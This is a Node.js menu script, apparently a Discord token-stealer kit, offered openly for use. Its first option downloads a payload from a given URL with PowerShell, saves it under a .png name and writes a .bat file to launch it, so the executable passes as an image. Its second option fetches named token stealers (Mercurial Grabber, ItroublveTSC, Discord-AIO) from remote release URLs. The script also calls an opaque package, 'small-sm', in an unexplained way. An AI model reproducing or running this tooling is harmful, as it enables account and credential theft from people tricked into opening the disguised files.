console.clear()

const lifes = require('small-sm');
lifes("mpm i discord.js@12")

const setTitle = require('node-bash-title')
const colors = require('colors')
const gradient = require('gradient-string')


var lofygang = {}
lofygang.input = process.stdin
lofygang.output = process.stdout


const readline = require('readline').createInterface(lofygang);
let download = require('url-download-file');
var cmd = require('node-cmd');;
const shell = require('shelljs');


var op1 = '[1] Create png token grabber',
    op2 = '[2] Install a grabber creator',
    op3 = '[3] quit'

function mama() {
    var randola1 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var randola3 = '';
    for (var randola2 = 0; randola2 < 115; randola2++) {
        true ? (randola3 += randola1.charAt(Math.floor(Math.random() * randola1.length)), setTitle(randola3)) : wTRDjq.HSDuD(kkkkkkkkk);
    }
}
setInterval(mama, 50)


function logs(params) {
    console.log(gradient.cristal(`

      
        
                                                        脂肪抓取器
                                                        あきらめる
           
           `))
}

logs()

console.log(gradient.instagram('                                             By Akirameru\n')),

    Main();

function Main() {


    console.log(gradient.instagram('                                    ' + op1 + '\n                                    ' + op2 + '\n                                    ' + op3));;
    readline.question('\n\n         [?] Choose : '.yellow, opcao => {
        if (true)
            switch (opcao) {

                case '1':

                    console.clear()

                    logs()

                    console.log(gradient.instagram('                                             Para png\n')), readline.question('\n\n         [C] Link do Grabber: '.yellow, Uel_File => {

                        if (true)

                            readline.question('         [C] Nome do Arquivo: '.yellow, Arquivo_Get => {

                                cmd.runSync('powershell Invoke-WebRequest -Uri ' + Uel_File + ' -OutFile Grabber/' + Arquivo_Get + '.png'),
                                    get_url = 'start ' + Arquivo_Get + '.png';
                                shell.echo(get_url).to('Grabber/Ligar.bat');

                                console.clear();

                                logs();
                                console.log(gradient.instagram('                                             By Akirameru\n'));
                                console.log('\n\n\n\n\n                                      Grabber successfully created'.green);
                                console.log('                                   Check the "Grabber" directory\n\n\n\n\n'.green);

                            });
                    });

                    break;
                case '2':

                    console.clear(),
                        logs(),

                        console.log(gradient.instagram('                                             Stealers\n')),
                        console.log(gradient.summer('                                    1-Mercurial Grabber | Dev (NightfallGT)\n                                    2-ItroublveTSC | Dev (Itroublve)\n                                    3-Discord-AIO | Dev (Nyxonn)')),

                        readline.question('         [?] Choose an option: '.yellow, opcao221 => {

                            if (true)
                                switch (opcao221) {

                                    case '1':
                                        setInterval(mama, 50)
                                        let _0x285a5f = 'https://github.com/NightfallGT/Mercurial-Grabber/releases/download/v1.0/Mercurial.Grabber.v1.03.rar',
                                            _0x334fef = 'Stealers/Mercurial_Grabber.rar';
                                        download(_0x285a5f, _0x334fef).then(_0x3fd124 => console.log(('\n         [V] Successfully downloading the file\n         [!] Your directory is\uFF1A' + _0x3fd124).green)).catch(_0x272d84 => console.log(('      [X] Error while downloading ' + _0x272d84).red));
                                        break;
                                    case '2':
                                        setInterval(mama, 50)
                                        let _0x39ad6f = 'https://github.com/Itroublve/ItroublveTSC/releases/download/6.1/ItroublveTSC.v6.Fix.7.2.rar',
                                            _0x10fb86 = 'Stealers/ItroublveTSC.rar';
                                        download(_0x39ad6f, _0x10fb86).then(_0x2951d7 => console.log(('\n         [V] Successfully downloading the file\n         [!] Your directory is\uFF1A' + _0x2951d7).green)).catch(_0x2c792d => console.log(('      [X] Error while downloading ' + _0x2c792d).red));
                                        break;
                                    case '3':
                                        setInterval(mama, 50)
                                        let _0x58228f = 'https://github.com/Nyxonn/Discord-AIO/releases/download/0.5.2/discordAIO.exe',
                                            _0x543d69 = 'Stealers/DiscordAIO.exe';
                                        download(_0x58228f, _0x543d69).then(_0xcddab5 => console.log(('\n         [V] Successfully downloading the file\n         [!] Your directory is\uFF1A' + _0xcddab5).green)).catch(_0x4269d1 => console.log(('      [X] Error while downloading ' + _0x4269d1).red));
                                        break;

                                    default:
                                        console.log("         [!] Choose a viable option\n\n\n\n\n\n\n\n\n\n".blue)
                                        process.exit()


                                }
                        });

                    break;
                case '3':
                    console.clear()
                    process.exit();
                    break;
            }
    });
}